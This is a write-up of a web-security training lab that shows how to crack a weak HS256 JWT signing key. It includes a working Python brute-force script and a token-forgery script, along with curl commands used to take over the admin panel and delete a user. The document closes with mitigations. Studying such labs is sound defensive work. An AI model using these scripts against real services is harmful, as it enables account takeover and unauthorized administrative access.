@@ -1,0 +1,295 @@
+---
+title: "JWT Authentication Bypass via Weak Signing Key"
+description: "How to exploit weak JWT signing keys by bruteforcing the secret to forge administrator tokens and bypass authentication."
+labUrl: "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key"
+category: "JWT"
+date: "2025-02-27"
+---
+
+## Lab Description (contains spoilers)
+
+This lab uses a JWT-based mechanism for handling sessions. The JWT signing key is weak and can be brute-forced using a wordlist of common secrets. To solve the lab, you need to brute-force the secret key used to sign the JWT, then use it to forge a valid JWT that gives you access to the admin panel and delete the user `carlos`.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+## Necessary Background Concepts To Solve The Lab
+
+### What is JWT (JSON Web Token)?
+
+JWT is a compact, URL-safe means of representing **Claims\*** to be transferred between two parties. It's commonly used for authentication and information exchange in web applications. It uses base64 encoding to ensure URL-safe transmission.
+
+A JWT consists of three parts separated by dots (`.`):
+
+```
+header.payload.signature
+```
+
+For example:
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJleHAiOjE3NzIxOTg5NTd9.signature_here
+```
+
+Breaking down each part:
+
+**1. Header** (Base64URL encoded JSON):
+```json
+{
+  "kid": "170c351e-58cc-4e4b-9116-6e7924337580",
+  "alg": "HS256"
+}
+```
+- `alg`: The signing algorithm (HS256 = HMAC-SHA256)
+- `kid`: Key ID (optional identifier for the signing key)
+
+**2. Payload** (Base64URL encoded JSON):
+```json
+{
+  "iss": "portswigger",
+  "exp": 1772198957,
+  "sub": "wiener"
+}
+```
+- `iss`: Issuer of the token
+- `exp`: Expiration timestamp
+- `sub`: Subject (usually the username)
+
+**3. Signature**:
+The signature is created by taking the encoded header and payload, and signing them with a secret key using the algorithm specified in the header:
+
+```
+# Pseudocode
+
+message = base64UrlEncode(header) + "." + base64UrlEncode(payload) 
+
+key = JWT_SECRET # It could be a password, API key, UUID, or any other string
+
+signature = HMACSHA256(message, key)  # This is just the signature part, not the complete JWT
+```
+
+The signature ensures that the token hasn't been tampered with. If an attacker modifies the header or payload, the signature won't match unless they know the secret key.
+
+**The complete JWT would be constructed as:**
+
+```
+# Pseudocode
+
+jwt = base64UrlEncode(header) + "." + base64UrlEncode(payload) + "." + signature
+```
+
+### What is HS256 (HMAC-SHA256)?
+
+HS256 is a **symmetric** signing algorithm, meaning the same secret key is used to both sign and verify the token. This is different from asymmetric algorithms like RS256, which use a private key to sign and a public key to verify.
+
+The security of HS256 depends entirely on the secrecy and strength of the key. If the key is weak (like "secret", "password", or "secret1"), it can be brute-forced.
+
+### Why is Brute-forcing Possible?
+
+Since the signature is deterministic (same input + same key = same signature), an attacker can:
+1. Take the JWT's header and payload
+2. Try signing it with different secret keys from a wordlist
+3. Compare the generated signature with the original
+4. When they match, the secret key has been found
+
+This is only feasible when the secret is weak and exists in common wordlists.
+
+## Writeup
+
+Let's explore the lab's login page directly and log in to get a valid JWT session token:
+
+```bash
+curl "https://<lab-url>.web-security-academy.net/login"
+```
+
+The login page has a simple form with a CSRF token:
+
+```html
+<form class=login-form method=POST action="/login">
+    <input required type="hidden" name="csrf" value="fthIkYLXgsmolAFaGeb1sSSEMeShaZtX">
+    <label>Username</label>
+    <input required type=username name="username" autofocus>
+    <label>Password</label>
+    <input required type=password name="password">
+    <button class=button type=submit> Log in </button>
+</form>
+```
+
+Let's log in with the provided credentials:
+
+```bash
+curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=KmODI4GCLxAFAM1LoQhLZpDVOO1kPySm&username=wiener&password=peter"
+```
+
+> **Command breakdown**: \
+`-D -` = dump response headers to stdout \
+`-d "csrf=...&username=wiener&password=peter"` = send POST data (automatically sets method to POST and Content-Type to application/x-www-form-urlencoded) \
+
+Response:
+
+```
+HTTP/2 302 
+location: /my-account?id=wiener
+set-cookie: session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0.YBG0i0B9Qamr6Gw50igBg_ZdwEbbzUPzHKIpG_ecBOk; Secure; HttpOnly; SameSite=None
+```
+
+The session cookie is a JWT token. Let's decode it to understand its structure:
+
+```bash
+echo "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9" | base64 -d | jq .
+```
+
+> **Command breakdown**: \
+`echo "..."` = output the JWT header part \
+`base64 -d` = decode base64 \
+`jq .` = pretty-print JSON
+
+Header output:
+
+```json
+{
+  "kid": "170c351e-58cc-4e4b-9116-6e7924337580",
+  "alg": "HS256"
+}
+```
+
+Now decode the payload:
+
+```bash
+echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0" | base64 -d | jq .
+```
+
+Payload output:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1772198957,
+  "sub": "wiener"
+}
+```
+
+The JWT uses **HS256** (HMAC-SHA256) for signing, which means it uses a symmetric secret key. If the secret is weak, we can brute-force it. Let's create a Python script to crack the JWT signing key using the suggested wordlist from the lab description:
+
+```python
+import hmac
+import hashlib
+import base64
+import urllib.request
+
+JWT = "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0.YBG0i0B9Qamr6Gw50igBg_ZdwEbbzUPzHKIpG_ecBOk"
+
+WORDLIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"
+
+header, payload, target_signature = JWT.split('.')
+
+wordlist = urllib.request.urlopen(WORDLIST_URL)
+
+def create_jwt_signature_from_secret(secret):
+    message = f"{header}.{payload}"
+    hmac_digest = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
+    jwt_signature = base64.urlsafe_b64encode(hmac_digest).decode().rstrip('=')
+    return jwt_signature
+
+for secret in wordlist.read().decode().splitlines():
+    if target_signature == create_jwt_signature_from_secret(secret):
+        print(f"Found secret: {secret}")
+        break
+else:
+    print("Secret not found")
+```
+
+> **Script breakdown**: \
+> The script performs a JWT signature brute-force attack by:
+> 1. **Downloading** the jwt-secrets wordlist containing common JWT signing secrets
+> 2. **Iterating** through each potential secret key from the wordlist
+> 3. **Computing** HMAC-SHA256 of the **message** (`header + '.' + payload`) with each secret
+> 4. **Base64URL encoding** the HMAC digest to generate a test signature
+> 5. **Comparing** the generated signature with the original JWT signature
+> 6. **Matching** indicates the correct JWT **secret** (signing key) has been found
+
+Expected output:
+
+```
+Found secret: secret1
+```
+
+Now we can forge a JWT with `sub: "administrator"` to gain admin access.
+
+Let's create a script to forge the token:
+
+```python
+import hmac
+import hashlib
+import base64
+
+JWT_SECRET = "secret1"
+
+def b64(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')
+
+header = '{"kid":"170c351e-58cc-4e4b-9116-6e7924337580","alg":"HS256"}'
+
+tampered_jwt_payload = '{"iss":"portswigger","exp":1772198957,"sub":"administrator"}'
+
+message = f"{b64(header.encode())}.{b64(tampered_jwt_payload.encode())}"
+
+forged_signature = b64(hmac.new(JWT_SECRET.encode(), message.encode(), hashlib.sha256).digest())
+
+admin_jwt = f"{message}.{forged_signature}"
+
+print(admin_jwt)
+```
+
+> **Script breakdown**: \
+> The script creates a new JWT with:
+> 1. Same header (HS256 algorithm)
+> 2. Modified payload with `"sub": "administrator"`
+> 3. Valid signature computed using the cracked secret `secret1`
+
+Example output:
+
+```
+eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs
+```
+
+Now let's access the admin panel with our forged JWT:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin" \
+  -b "session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs" \
+  | grep -A 5 "carlos"
+```
+
+> **Command breakdown**: \
+`-b "session=..."` = send the forged JWT as a session cookie \
+`grep -A 5 "carlos"` = show lines containing "carlos" and 5 lines after (PortSwigger labs always include a user "carlos" to delete in the admin panel, so this is a quick way to verify admin access)
+
+Response:
+
+```html
+<span>carlos - </span>
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+
+Now that we have admin access, let's delete the user carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
+  -b "session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs"
+```
+
+The JWT authentication bypass allowed us to **send carlos into the digital void**, completing the lab.
+
+## Mitigation Strategies
+
+1. **Use strong secrets**: JWT signing keys should be long, random, and cryptographically secure (at least 256 bits for HS256). Never use dictionary words or common phrases
+2. **Implement asymmetric algorithms if possible**: Consider using RS256 (RSA) or ES256 (ECDSA) instead of HS256. These use public/private key pairs, making brute-force attacks impossible
+3. **Rotate keys regularly**: Implement key rotation policies to limit the impact of a compromised key
+4. **Store secrets securely**: Use environment variables or secret management systems (like HashiCorp Vault, AWS Secrets Manager) instead of hardcoding secrets
+5. **Validate all JWT claims**: Always verify the issuer (`iss`), expiration (`exp`), and other claims server-side
+
+## References
+
+**Claims\*** are statements about an entity (typically the user) and additional data, such as identity (`sub`), issuer (`iss`), expiration time (`exp`), and other metadata. [Learn more about JWT claims](https://datatracker.ietf.org/doc/html/rfc7519#section-4)
+
+## Resources
+
+[JWT.io Debugger](https://jwt.io/) This is an interactive tool for decoding, verifying, and debugging JWT tokens. It was also useful for me when I was a web developer.
